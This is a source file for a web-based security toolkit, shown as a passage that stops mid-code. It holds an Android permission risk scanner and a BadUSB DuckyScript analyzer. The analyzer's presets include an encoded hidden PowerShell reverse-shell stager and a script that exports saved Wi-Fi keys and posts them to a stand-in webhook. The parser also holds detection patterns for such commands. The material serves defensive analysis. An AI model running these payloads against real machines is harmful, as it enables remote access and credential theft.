"use client";

import React, { useState, useEffect, useCallback, useMemo } from "react";
import {
  Terminal,
  Shield,
  Search,
  Globe,
  Lock,
  Key,
  Cpu,
  Network,
  AlertTriangle,
  CheckCircle2,
  XCircle,
  Copy,
  Check,
  RefreshCw,
  Zap,
  Server,
  FileCode,
  Activity,
  Layers,
  Database,
  Eye,
  Radio,
  HardDrive,
  Smartphone,
  Usb,
  Bug,
  Wifi,
  Clock,
  Trash2,
} from "lucide-react";
import type { Tool } from "@/lib/tools/types";
import { useToolCard, ToolActions } from "@/components/tool/ToolPlaygrounds";

/* ============================================================================
 * HELPER: INLINE COPY BUTTON
 * ========================================================================== */
function InlineCopyButton({ text, label = "Copy" }: { text: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    } catch {
      // ignore
    }
  };
  return (
    <button
      type="button"
      onClick={handleCopy}
      className="inline-flex items-center gap-1 rounded-xs border border-border bg-background px-2 py-1 font-heading text-[10px] font-bold uppercase tracking-wider text-text-muted hover:border-accent hover:text-accent transition cursor-pointer"
    >
      {copied ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
      {copied ? "Copied" : label}
    </button>
  );
}

/* ============================================================================
 * 1. ANDROID APK MANIFEST & PERMISSION RISK SCANNER
 * ========================================================================== */
interface AndroidPermissionMeta {
  id: string;
  shortName: string;
  weight: number;
  category: "Special / Admin" | "SMS & Call" | "Surveillance" | "Storage & System";
  restrictedAndroid15: boolean;
  appOp: string;
  abuseDesc: string;
}

const ANDROID_PERMISSIONS: AndroidPermissionMeta[] = [
  {
    id: "android.permission.BIND_ACCESSIBILITY_SERVICE",
    shortName: "BIND_ACCESSIBILITY_SERVICE",
    weight: 32,
    category: "Special / Admin",
    restrictedAndroid15: true,
    appOp: "ACCESS_ACCESSIBILITY",
    abuseDesc: "Reads screen contents, steals 2FA codes, auto-clicks banking transfers, and blocks uninstall.",
  },
  {
    id: "android.permission.SYSTEM_ALERT_WINDOW",
    shortName: "SYSTEM_ALERT_WINDOW",
    weight: 18,
    category: "Special / Admin",
    restrictedAndroid15: true,
    appOp: "SYSTEM_ALERT_WINDOW",
    abuseDesc: "Draws phishing overlays on top of banking and crypto wallet apps (Cloak & Dagger).",
  },
  {
    id: "android.permission.REQUEST_INSTALL_PACKAGES",
    shortName: "REQUEST_INSTALL_PACKAGES",
    weight: 20,
    category: "Special / Admin",
    restrictedAndroid15: true,
    appOp: "REQUEST_INSTALL_PACKAGES",
    abuseDesc: "Silently drops and installs secondary Trojan APK payloads when paired with Accessibility.",
  },
  {
    id: "android.permission.BIND_DEVICE_ADMIN",
    shortName: "BIND_DEVICE_ADMIN",
    weight: 22,
    category: "Special / Admin",
    restrictedAndroid15: true,
    appOp: "BIND_DEVICE_ADMIN",
    abuseDesc: "Prevents user uninstallation, locks device screen, or wipes storage on command.",
  },
  {
    id: "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
    shortName: "BIND_NOTIFICATION_LISTENER_SERVICE",
    weight: 18,
    category: "Special / Admin",
    restrictedAndroid15: true,
    appOp: "ACCESS_NOTIFICATIONS",
    abuseDesc: "Intercepts all incoming OTP/2FA push notifications and silently dismisses security alerts.",
  },
  {
    id: "android.permission.READ_SMS",
    shortName: "READ_SMS",
    weight: 16,
    category: "SMS & Call",
    restrictedAndroid15: true,
    appOp: "READ_SMS",
    abuseDesc: "Exfiltrates historical SMS messages and banking one-time passwords.",
  },
  {
    id: "android.permission.RECEIVE_SMS",
    shortName: "RECEIVE_SMS",
    weight: 16,
    category: "SMS & Call",
    restrictedAndroid15: true,
    appOp: "RECEIVE_SMS",
    abuseDesc: "Triggers real-time broadcast receiver on incoming SMS OTPs.",
  },
  {
    id: "android.permission.SEND_SMS",
    shortName: "SEND_SMS",
    weight: 15,
    category: "SMS & Call",
    restrictedAndroid15: true,
    appOp: "SEND_SMS",
    abuseDesc: "Sends worm propagation links to contact list or subscribes to premium SMS numbers.",
  },
  {
    id: "android.permission.READ_CALL_LOG",
    shortName: "READ_CALL_LOG",
    weight: 12,
    category: "SMS & Call",
    restrictedAndroid15: true,
    appOp: "READ_CALL_LOG",
    abuseDesc: "Harvests call history metadata and voice verification numbers.",
  },
  {
    id: "android.permission.READ_CONTACTS",
    shortName: "READ_CONTACTS",
    weight: 10,
    category: "SMS & Call",
    restrictedAndroid15: false,
    appOp: "READ_CONTACTS",
    abuseDesc: "Exfiltrates full address book for social engineering or extortion.",
  },
  {
    id: "android.permission.RECORD_AUDIO",
    shortName: "RECORD_AUDIO",
    weight: 14,
    category: "Surveillance",
    restrictedAndroid15: false,
    appOp: "RECORD_AUDIO",
    abuseDesc: "Captures ambient microphone audio when combined with foreground service.",
  },
  {
    id: "android.permission.CAMERA",
    shortName: "CAMERA",
    weight: 10,
    category: "Surveillance",
    restrictedAndroid15: false,
    appOp: "CAMERA",
    abuseDesc: "Captures front/rear photos or QR codes.",
  },
  {
    id: "android.permission.ACCESS_BACKGROUND_LOCATION",
    shortName: "ACCESS_BACKGROUND_LOCATION",
    weight: 16,
    category: "Surveillance",
    restrictedAndroid15: true,
    appOp: "ACCESS_BACKGROUND_LOCATION",
    abuseDesc: "24/7 continuous GPS tracking even when the app UI is closed.",
  },
  {
    id: "android.permission.ACCESS_FINE_LOCATION",
    shortName: "ACCESS_FINE_LOCATION",
    weight: 8,
    category: "Surveillance",
    restrictedAndroid15: false,
    appOp: "FINE_LOCATION",
    abuseDesc: "Precise GPS/Wi-Fi/BLE coordinate triangulation.",
  },
  {
    id: "android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION",
    shortName: "FOREGROUND_SERVICE_MEDIA_PROJECTION",
    weight: 18,
    category: "Surveillance",
    restrictedAndroid15: false,
    appOp: "PROJECT_MEDIA",
    abuseDesc: "Streams live screen video of the victim device to a remote C2 server.",
  },
  {
    id: "android.permission.RECEIVE_BOOT_COMPLETED",
    shortName: "RECEIVE_BOOT_COMPLETED",
    weight: 10,
    category: "Storage & System",
    restrictedAndroid15: false,
    appOp: "BOOT_COMPLETED",
    abuseDesc: "Respawns background C2 service automatically whenever the phone reboots.",
  },
  {
    id: "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
    shortName: "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
    weight: 10,
    category: "Storage & System",
    restrictedAndroid15: false,
    appOp: "IGNORE_BATTERY_OPTIMIZATIONS",
    abuseDesc: "Prevents Android Doze mode from killing persistent spyware sockets.",
  },
  {
    id: "android.permission.QUERY_ALL_PACKAGES",
    shortName: "QUERY_ALL_PACKAGES",
    weight: 12,
    category: "Storage & System",
    restrictedAndroid15: false,
    appOp: "QUERY_ALL_PACKAGES",
    abuseDesc: "Enumerates installed banking, crypto, and security apps to tailor overlay attacks.",
  },
  {
    id: "android.permission.MANAGE_EXTERNAL_STORAGE",
    shortName: "MANAGE_EXTERNAL_STORAGE",
    weight: 15,
    category: "Storage & System",
    restrictedAndroid15: false,
    appOp: "MANAGE_EXTERNAL_STORAGE",
    abuseDesc: "Bypasses Scoped Storage to read/encrypt all user photos, downloads, and backups.",
  },
  {
    id: "android.permission.PACKAGE_USAGE_STATS",
    shortName: "PACKAGE_USAGE_STATS",
    weight: 12,
    category: "Storage & System",
    restrictedAndroid15: true,
    appOp: "GET_USAGE_STATS",
    abuseDesc: "Polls which foreground app the user is currently viewing to trigger phishing overlays.",
  },
];

const APK_MANIFEST_PRESETS: Record<
  "trojan" | "stalkerware" | "utility",
  { label: string; pkg: string; targetSdk: number; xml: string; perms: string[] }
> = {
  trojan: {
    label: "Spyware / Banking Trojan APK",
    pkg: "com.update.playservice.sec",
    targetSdk: 28,
    perms: [
      "BIND_ACCESSIBILITY_SERVICE",
      "SYSTEM_ALERT_WINDOW",
      "READ_SMS",
      "RECEIVE_SMS",
      "RECEIVE_BOOT_COMPLETED",
      "REQUEST_INSTALL_PACKAGES",
      "BIND_NOTIFICATION_LISTENER_SERVICE",
      "QUERY_ALL_PACKAGES",
      "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
    ],
    xml: `<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.update.playservice.sec">
    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="28" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <application android:allowBackup="true" android:usesCleartextTraffic="true">
        <service android:name=".CoreAccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true" />
        <service android:name=".OtpInterceptService"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="true" />
    </application>
</manifest>`,
  },
  stalkerware: {
    label: "Fake Flashlight Stalkerware",
    pkg: "com.bright.led.torch.pro",
    targetSdk: 31,
    perms: [
      "CAMERA",
      "RECORD_AUDIO",
      "ACCESS_FINE_LOCATION",
      "ACCESS_BACKGROUND_LOCATION",
      "READ_CONTACTS",
      "READ_CALL_LOG",
      "RECEIVE_BOOT_COMPLETED",
      "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
    ],
    xml: `<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.bright.led.torch.pro">
    <uses-sdk android:minSdkVersion="26" android:targetSdkVersion="31" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
</manifest>`,
  },
  utility: {
    label: "Normal Utility App",
    pkg: "org.opensource.qrscanner",
    targetSdk: 35,
    perms: ["CAMERA"],
    xml: `<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="org.opensource.qrscanner">
    <uses-sdk android:minSdkVersion="29" android:targetSdkVersion="35" />
    <uses-permission android:name="android.permission.CAMERA" />
    <application android:allowBackup="false" android:usesCleartextTraffic="false" />
</manifest>`,
  },
};

function AndroidApkManifestPermissionScanner({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [preset, setPreset] = useState<"trojan" | "stalkerware" | "utility">("trojan");
  const [packageName, setPackageName] = useState(APK_MANIFEST_PRESETS.trojan.pkg);
  const [targetSdk, setTargetSdk] = useState(APK_MANIFEST_PRESETS.trojan.targetSdk);
  const [manifestXml, setManifestXml] = useState(APK_MANIFEST_PRESETS.trojan.xml);
  const [selectedPerms, setSelectedPerms] = useState<string[]>(APK_MANIFEST_PRESETS.trojan.perms);

  const applyPreset = useCallback((key: "trojan" | "stalkerware" | "utility") => {
    const p = APK_MANIFEST_PRESETS[key];
    setPreset(key);
    setPackageName(p.pkg);
    setTargetSdk(p.targetSdk);
    setManifestXml(p.xml);
    setSelectedPerms(p.perms);
  }, []);

  useEffect(() => {
    if (resetTrigger > 0) {
      applyPreset("trojan");
    }
  }, [resetTrigger, applyPreset]);

  const parseManifestToState = () => {
    const found: string[] = [];
    for (const perm of ANDROID_PERMISSIONS) {
      if (manifestXml.includes(perm.shortName)) {
        found.push(perm.shortName);
      }
    }
    const pkgMatch = manifestXml.match(/package\s*=\s*["']([^"']+)["']/);
    if (pkgMatch?.[1]) setPackageName(pkgMatch[1]);
    const sdkMatch = manifestXml.match(/targetSdkVersion\s*=\s*["'](\d+)["']/);
    if (sdkMatch?.[1]) setTargetSdk(parseInt(sdkMatch[1], 10));
    setSelectedPerms(found);
  };

  const togglePerm = (shortName: string) => {
    setSelectedPerms((prev) =>
      prev.includes(shortName) ? prev.filter((x) => x !== shortName) : [...prev, shortName]
    );
  };

  const analysis = useMemo(() => {
    const activeMeta = ANDROID_PERMISSIONS.filter((p) => selectedPerms.includes(p.shortName));
    let rawScore = activeMeta.reduce((acc, p) => acc + p.weight, 0);

    const synergies: { title: string; severity: "CRITICAL" | "HIGH"; desc: string }[] = [];

    const has = (name: string) => selectedPerms.includes(name);
    if (has("BIND_ACCESSIBILITY_SERVICE") && (has("SYSTEM_ALERT_WINDOW") || has("READ_SMS") || has("BIND_NOTIFICATION_LISTENER_SERVICE"))) {
      rawScore += 25;
      synergies.push({
        title: "Banking Trojan / ATS Auto-Clicker Chain",
        severity: "CRITICAL",
        desc: "Combines Accessibility Service screen-reading/clicking with Overlay windows or OTP interception (Cerberus/SharkBot/Xenomorph signature).",
      });
    }
    if (has("REQUEST_INSTALL_PACKAGES") && has("BIND_ACCESSIBILITY_SERVICE")) {
      rawScore += 18;
      synergies.push({
        title: "Silent Dropper & Self-Granting Escalation",
        severity: "CRITICAL",
        desc: "REQUEST_INSTALL_PACKAGES triggers package installer while Accessibility automatically clicks 'Allow' on prompt dialogs.",
      });
    }
    if (has("ACCESS_BACKGROUND_LOCATION") && has("RECORD_AUDIO") && has("RECEIVE_BOOT_COMPLETED")) {
      rawScore += 16;
      synergies.push({
        title: "Persistent Stalkerware / Surveillance Implant",
        severity: "HIGH",
        desc: "Combines 24/7 background GPS tracking, ambient microphone capture, and boot persistence.",
      });
    }
    if (targetSdk < 33) {
      rawScore += 10;
      synergies.push({
        title: `Legacy targetSdkVersion (${targetSdk}) Bypass Attempt`,
        severity: "HIGH",
        desc: "Targeting older Android SDKs attempts to evade granular runtime permission prompts and Google Play API 34+ enforcement.",
      });
    }

    const usesCleartext = manifestXml.includes('usesCleartextTraffic="true"');
    if (usesCleartext) {
      rawScore += 8;
    }

    const riskScore = Math.min(100, rawScore);
    const restrictedPerms = activeMeta.filter((p) => p.restrictedAndroid15);

    const revokeCmds = activeMeta
      .map((p) => `adb shell appops set ${packageName} ${p.appOp} ignore`)
      .join("\n");

    return {
      activeMeta,
      riskScore,
      synergies,
      restrictedPerms,
      usesCleartext,
      revokeCmds,
    };
  }, [selectedPerms, targetSdk, manifestXml, packageName]);

  useEffect(() => {
    const report = [
      `=== ANDROID APK MANIFEST & PERMISSION RISK REPORT ===`,
      `Package Name: ${packageName}`,
      `Target SDK: API ${targetSdk}`,
      `Risk Score: ${analysis.riskScore} / 100 (${
        analysis.riskScore >= 75 ? "CRITICAL MALWARE RISK" : analysis.riskScore >= 40 ? "ELEVATED / SUSPICIOUS" : "LOW RISK"
      })`,
      `Active Permissions (${analysis.activeMeta.length}): ${analysis.activeMeta.map((p) => p.shortName).join(", ") || "None"}`,
      `Android 15/16 Restricted Settings (ECM) Guarded: ${
        analysis.restrictedPerms.map((p) => p.shortName).join(", ") || "None"
      }`,
      ``,
      `--- DETECTED TOXIC SYNERGY CHAINS ---`,
      ...(analysis.synergies.length
        ? analysis.synergies.map((s) => `[${s.severity}] ${s.title}: ${s.desc}`)
        : ["No multi-permission toxic chains detected."]),
      ``,
      `--- FORENSIC AAPT2 & ADB APPOPS COMMANDS ---`,
      `aapt2 dump permissions sample.apk`,
      `apkanalyzer manifest print sample.apk`,
      `adb shell dumpsys package ${packageName} | grep -E "permission|granted=true"`,
      analysis.revokeCmds || `# No dangerous appops selected`,
      `adb uninstall ${packageName}`,
    ].join("\n");
    setOutput(report);
  }, [packageName, targetSdk, analysis, setOutput]);

  return (
    <div className="space-y-5">
      {/* Presets & Package Metadata */}
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
        <div className="flex items-center gap-2">
          <Smartphone className="h-4 w-4 text-accent" />
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            APK Manifest Profile Presets
          </span>
        </div>
        <div className="flex flex-wrap gap-1.5">
          {(["trojan", "stalkerware", "utility"] as const).map((k) => (
            <button
              key={k}
              type="button"
              onClick={() => applyPreset(k)}
              className={`rounded-xs border px-2.5 py-1 font-heading text-[11px] font-bold uppercase tracking-wider transition cursor-pointer ${
                preset === k
                  ? "border-[#ff6a00] bg-[#ff6a00] text-white"
                  : "border-border bg-background text-text-muted hover:border-accent hover:text-text"
              }`}
            >
              {APK_MANIFEST_PRESETS[k].label}
            </button>
          ))}
        </div>
      </div>

      {/* Manifest XML Input + Metadata */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
        <div className="lg:col-span-7 space-y-2">
          <div className="flex items-center justify-between">
            <label className="font-heading text-xs font-bold uppercase tracking-wider text-text-muted">
              AndroidManifest.xml Snippet
            </label>
            <button
              type="button"
              onClick={parseManifestToState}
              className="inline-flex items-center gap-1 rounded-xs bg-[#ff6a00] px-2.5 py-1 font-heading text-[10px] font-bold uppercase tracking-wider text-white hover:opacity-90 transition cursor-pointer"
            >
              <Search className="h-3 w-3" />
              Parse XML Permissions
            </button>
          </div>
          <textarea
            rows={8}
            value={manifestXml}
            onChange={(e) => setManifestXml(e.target.value)}
            className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
            placeholder="Paste AndroidManifest.xml or aapt2 dump output..."
          />
          <div className="grid grid-cols-2 gap-3 pt-1">
            <div>
              <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
                Package ID
              </label>
              <input
                type="text"
                value={packageName}
                onChange={(e) => setPackageName(e.target.value)}
                className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
              />
            </div>
            <div>
              <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
                targetSdkVersion (API Level)
              </label>
              <input
                type="number"
                min={19}
                max={36}
                value={targetSdk}
                onChange={(e) => setTargetSdk(Number(e.target.value) || 34)}
                className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
              />
            </div>
          </div>
        </div>

        {/* Risk Score Dashboard */}
        <div className="lg:col-span-5 rounded-xs border border-border bg-background p-4 flex flex-col justify-between space-y-3">
          <div>
            <div className="flex items-center justify-between">
              <span className="font-heading text-xs font-bold uppercase tracking-wider text-text-muted">
                Composite APK Threat Score
              </span>
              <span
                className={`rounded-xs px-2 py-0.5 font-mono-code text-xs font-bold ${
                  analysis.riskScore >= 75
                    ? "bg-red-500/20 text-red-400 border border-red-500/40"
                    : analysis.riskScore >= 40
                    ? "bg-amber-500/20 text-amber-300 border border-amber-500/40"
                    : "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40"
                }`}
              >
                {analysis.riskScore} / 100
              </span>
            </div>
            <div className="mt-2 h-2.5 w-full rounded-xs bg-surface overflow-hidden border border-border">
              <div
                className={`h-full transition-all ${
                  analysis.riskScore >= 75
                    ? "bg-red-500"
                    : analysis.riskScore >= 40
                    ? "bg-amber-500"
                    : "bg-emerald-500"
                }`}
                style={{ width: `${analysis.riskScore}%` }}
              />
            </div>
          </div>

          {/* Android 15/16 Restricted Settings Banner */}
          <div className="rounded-xs border border-amber-500/30 bg-amber-500/10 p-3 space-y-1">
            <div className="flex items-center gap-1.5 font-heading text-xs font-bold text-amber-300">
              <Shield className="h-3.5 w-3.5 shrink-0" />
              Android 15/16 Enhanced Confirmation Mode (ECM)
            </div>
            <p className="text-[11px] text-text-muted leading-relaxed">
              {analysis.restrictedPerms.length > 0 ? (
                <>
                  Blocks sideloaded APKs (installed outside Play Store session installer) from enabling{" "}
                  <span className="font-mono-code text-amber-200">
                    {analysis.restrictedPerms.map((p) => p.shortName).join(", ")}
                  </span>{" "}
                  until manually unlocked via App Info &rarr; Restricted Settings.
                </>
              ) : (
                "No Android 15/16 Restricted Settings permissions currently toggled."
              )}
            </p>
          </div>

          {/* Toxic Synergies */}
          <div className="space-y-1.5">
            <span className="font-heading text-[11px] font-bold uppercase tracking-wider text-text-muted">
              Detected Toxic Permission Chains ({analysis.synergies.length})
            </span>
            {analysis.synergies.length === 0 ? (
              <div className="rounded-xs border border-emerald-500/30 bg-emerald-500/10 p-2.5 text-xs text-emerald-300">
                No dangerous multi-permission exploit chains detected.
              </div>
            ) : (
              analysis.synergies.map((s, i) => (
                <div
                  key={i}
                  className="rounded-xs border border-red-500/40 bg-red-500/10 p-2.5 space-y-0.5"
                >
                  <div className="flex items-center justify-between">
                    <span className="font-heading text-xs font-bold text-red-300">{s.title}</span>
                    <span className="font-mono-code text-[10px] font-bold text-red-400">
                      {s.severity}
                    </span>
                  </div>
                  <p className="text-[11px] text-text-muted leading-snug">{s.desc}</p>
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      {/* 20 Permission Matrix */}
      <div className="space-y-2">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            Interactive Android Permission Matrix ({selectedPerms.length} / {ANDROID_PERMISSIONS.length} Active)
          </span>
          <button
            type="button"
            onClick={() => setSelectedPerms([])}
            className="text-[11px] font-mono-code text-text-muted hover:text-accent cursor-pointer"
          >
            Clear All
          </button>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
          {ANDROID_PERMISSIONS.map((perm) => {
            const active = selectedPerms.includes(perm.shortName);
            return (
              <button
                key={perm.id}
                type="button"
                onClick={() => togglePerm(perm.shortName)}
                className={`rounded-xs border p-2.5 text-left transition cursor-pointer ${
                  active
                    ? "border-red-500/60 bg-red-500/10"
                    : "border-border bg-background hover:border-accent"
                }`}
              >
                <div className="flex items-center justify-between gap-2">
                  <span className="font-mono-code text-xs font-bold text-text">
                    {perm.shortName}
                  </span>
                  <div className="flex items-center gap-1">
                    {perm.restrictedAndroid15 && (
                      <span className="rounded-xs bg-amber-500/20 px-1.5 py-0.5 font-mono-code text-[9px] font-bold text-amber-300">
                        ECM 15+
                      </span>
                    )}
                    <span
                      className={`rounded-xs px-1.5 py-0.5 font-mono-code text-[10px] font-bold ${
                        active ? "bg-red-500/30 text-red-300" : "bg-surface text-text-muted"
                      }`}
                    >
                      +{perm.weight}
                    </span>
                  </div>
                </div>
                <p className="mt-1 text-[11px] text-text-muted leading-snug">{perm.abuseDesc}</p>
              </button>
            );
          })}
        </div>
      </div>

      {/* Generated AAPT2 & ADB AppOps Commands */}
      <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
            Generated AAPT2 Inspection & ADB AppOps Lockdown Commands
          </span>
          <InlineCopyButton
            text={`aapt2 dump permissions sample.apk\n${analysis.revokeCmds}`}
            label="Copy ADB Commands"
          />
        </div>
        <pre className="overflow-x-auto rounded-xs bg-surface p-3 font-mono-code text-xs text-text leading-relaxed">
{`# 1. Inspect compiled binary AndroidManifest.xml without decompiling
aapt2 dump permissions sample.apk
apkanalyzer manifest print sample.apk

# 2. Restrict active AppOps via ADB without root
${analysis.revokeCmds || "# Toggle permissions above to generate appops revocation commands"}`}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 2. USB HID BADUSB & DUCKYSCRIPT PAYLOAD ANALYZER
 * ========================================================================== */
interface UsbVidPidEntry {
  vid: string;
  pid: string;
  vendor: string;
  device: string;
  risk: "TRUSTED" | "DUAL-USE" | "HIGH-RISK BADUSB";
  notes: string;
}

const USB_VID_DATABASE: UsbVidPidEntry[] = [
  {
    vid: "05AC",
    pid: "024F",
    vendor: "Apple, Inc.",
    device: "Aluminum Mini Keyboard (ANSI) — Commonly Spoofed by Rubber Ducky to bypass macOS Keyboard Assistant",
    risk: "DUAL-USE",
    notes: "Verify physical keyboard matches Apple vendor string; block unexpected HID hotplugs on servers.",
  },
  {
    vid: "046D",
    pid: "C52B",
    vendor: "Logitech, Inc.",
    device: "Unifying Receiver (Composite HID Keyboard + Mouse — Vulnerable to MouseJack / KeySniffer if unpatched)",
    risk: "TRUSTED",
    notes: "Standard wireless receiver; often mimicked by wireless HID injection dongles.",
  },
  {
    vid: "1B4F",
    pid: "9206",
    vendor: "SparkFun Electronics",
    device: "Pro Micro 5V/16MHz (ATmega32U4 Native USB HID — Classic DIY BadUSB / Arduino Micro)",
    risk: "HIGH-RISK BADUSB",
    notes: "Microcontroller with native USB HID descriptor support; rarely legitimate in enterprise workstations.",
  },
  {
    vid: "2341",
    pid: "8036",
    vendor: "Arduino SA",
    device: "Arduino Leonardo (ATmega32U4 HID Keyboard/Mouse + CDC Serial)",
    risk: "HIGH-RISK BADUSB",
    notes: "Standard Arduino HID board used by penetration testers for keystroke injection.",
  },
  {
    vid: "0483",
    pid: "5740",
    vendor: "STMicroelectronics",
    device: "Flipper Zero Virtual COM Port / STM32WB55 BadUSB Composite Device",
    risk: "HIGH-RISK BADUSB",
    notes: "Default Flipper Zero USB identifier before custom VID:PID spoofing is enabled.",
  },
  {
    vid: "16C0",
    pid: "0486",
    vendor: "Van Ooijen Technische Informatica",
    device: "Teensyduino RawHID / Keyboard+Mouse+Joystick (PJRC Teensy BadUSB)",
    risk: "HIGH-RISK BADUSB",
    notes: "High-speed microcontroller capable of 1000+ WPM keystroke injection.",
  },
];

const DUCKYSCRIPT_PRESETS: Record<"revshell" | "wifi" | "benign", { label: string; script: string }> = {
  revshell: {
    label: "PowerShell Hidden Reverse Shell",
    script: `REM Flipper Zero / Hak5 Rubber Ducky Payload: Hidden PowerShell Stager
ID 05ac:024f Apple:Keyboard
DEFAULT_DELAY 40
DELAY 1000
GUI r
DELAY 450
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgAxAC4ANQAwACcALAA0ADQANAA0ACkA
ENTER`,
  },
  wifi: {
    label: "Wi-Fi Cleartext Profile Exfiltrator",
    script: `REM Exfiltrate saved Windows Wi-Fi WPA2 PSKs to webhook
DEFAULT_DELAY 30
DELAY 800
GUI r
DELAY 400
STRING cmd /c "netsh wlan export profile key=clear folder=%TEMP% && powershell Invoke-WebRequest -Uri https://canary.example.com/exfil -Method POST -InFile %TEMP%\\Wi-Fi*.xml"
CTRL-SHIFT ENTER
DELAY 600
ALT y
ENTER`,
  },
  benign: {
    label: "IT Kiosk Enrollment Macro",
    script: `REM Benign IT provisioning shortcut
DEFAULT_DELAY 50
DELAY 500
GUI r
DELAY 300
STRING ms-settings:workplace
ENTER`,
  },
};

function UsbHidBadUsbDuckyScriptAnalyzer({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [preset, setPreset] = useState<"revshell" | "wifi" | "benign">("revshell");
  const [scriptText, setScriptText] = useState(DUCKYSCRIPT_PRESETS.revshell.script);
  const [vidInput, setVidInput] = useState("1B4F");
  const [pidInput, setPidInput] = useState("9206");
  const [usbClass, setUsbClass] = useState<"03:01:01" | "08:06:50" | "03+02">("03:01:01");

  useEffect(() => {
    if (resetTrigger > 0) {
      setPreset("revshell");
      setScriptText(DUCKYSCRIPT_PRESETS.revshell.script);
      setVidInput("1B4F");
      setPidInput("9206");
    }
  }, [resetTrigger]);

  const parsedDucky = useMemo(() => {
    const lines = scriptText.split(/\r?\n/);
    let defaultDelay = 0;
    let totalMs = 0;
    let totalChars = 0;
    let spoofedId = "Default Hardware VID:PID";
    const decodedSteps: { lineNo: number; cmd: string; arg: string; ms: number; risk: "clean" | "warn" | "critical"; note: string }[] = [];
    const alerts: string[] = [];

    lines.forEach((raw, idx) => {
      const trimmed = raw.trim();
      if (!trimmed) return;
      const parts = trimmed.split(/\s+/);
      const cmd = parts[0].toUpperCase();
      const arg = trimmed.slice(parts[0].length).trim();

      let stepMs = defaultDelay;
      let risk: "clean" | "warn" | "critical" = "clean";
      let note = "";

      if (cmd === "REM" || cmd === "//") {
        stepMs = 0;
        note = "Comment (ignored by BadUSB compiler)";
      } else if (cmd === "DEFAULT_DELAY" || cmd === "DEFAULTDELAY") {
        defaultDelay = parseInt(arg, 10) || 0;
        stepMs = 0;
        note = `Sets inter-command delay to ${defaultDelay} ms`;
      } else if (cmd === "DELAY") {
        const d = parseInt(arg, 10) || 0;
        stepMs += d;
        note = `Pauses execution for ${d} ms (waits for OS dialog/window)`;
      } else if (cmd === "ID") {
        spoofedId = arg;
        risk = "warn";
        note = `Spoofs USB Device Descriptor VID:PID (${arg})`;
        alerts.push(`VID:PID Descriptor Spoofing detected: ${arg}`);
      } else if (cmd === "GUI" || cmd === "WINDOWS" || cmd === "COMMAND") {
        stepMs += 35;
        risk = arg.toLowerCase() === "r" ? "warn" : "clean";
        note =
          arg.toLowerCase() === "r"
            ? "Opens Windows Run dialog (Win+R) — primary initial access vector"
            : `Presses Super/Windows key + ${arg}`;
      } else if (cmd === "STRING" || cmd === "STRINGLN") {
        const charTime = arg.length * 8;
        stepMs += charTime;
        totalChars += arg.length;
        note = `Types ${arg.length} characters at ~750 WPM (${charTime} ms)`;
        if (/powershell|-enc|-w\s+hidden|bypass|iex|invoke-webrequest|downloadstring/i.test(arg)) {
          risk = "critical";
          alerts.push(`Line ${idx + 1}: Obfuscated/Hidden PowerShell execution detected.`);
        }
        if (/netsh\s+wlan\s+export.*key=clear|reg\s+save|mimikatz|sam/i.test(arg)) {
          risk = "critical";
